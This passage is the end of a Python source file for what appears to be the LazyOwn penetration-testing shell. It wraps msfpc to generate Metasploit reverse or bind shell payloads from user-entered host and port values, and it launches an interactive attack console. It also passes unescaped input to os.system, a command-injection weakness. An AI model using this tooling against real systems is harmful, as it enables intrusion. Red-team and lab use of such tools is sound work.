            "batch_loop": input("Enter BATCH or LOOP (optional): "),
            "verbose": input("Enter VERBOSE (optional): ")
        }

        msfpc_command = (
            f"msfpc {params['type']} {params['lhost']} {params['lport']} {params['cmd_msf']} "
            f"{params['bind_reverse']} {params['staged_stageless']} {params['protocol']} "
            f"{params['batch_loop']} {params['verbose']}"
        )

        print_msg(f"Generating payload with MSFPC: {msfpc_command}")
        os.system(msfpc_command)
        
        return


if __name__ == "__main__":
    p = LazyOwnShell()
    p.onecmd("p")
    if arguments:
        if arg.startswith("-c"):
            if len(arguments) == 2:
                cmd = arguments[1]
                os.system(
                    'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
                )
                p.onecmd('ipp')
                p.onecmd("rrhost")
                p.onecmd(cmd)
                p.cmdloop()
            else:
                print_error("you must pass the comand to execute ex; ./run -c ping")
                sys.exit(2)
        if arg.startswith("-p"):
            if len(arguments) == 2:
                payload = arguments[1]
                os.system(
                    'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
                )
                p.onecmd(f'payload {payload}')
                p.onecmd('ipp')
                p.onecmd("rrhost")

    if NOBANNER is False:
        print(
            f"    {BG_BLACK}{RED}{BANNER}{MAGENTA}{BOLD}Autor: {CYAN}{BOLD}{BG_RED}grisUN0{RESET}"
        )

    else:
        p.onecmd("rhost clean")    

    p.onecmd('ipp')
    p.onecmd("rrhost")
    p.cmdloop()
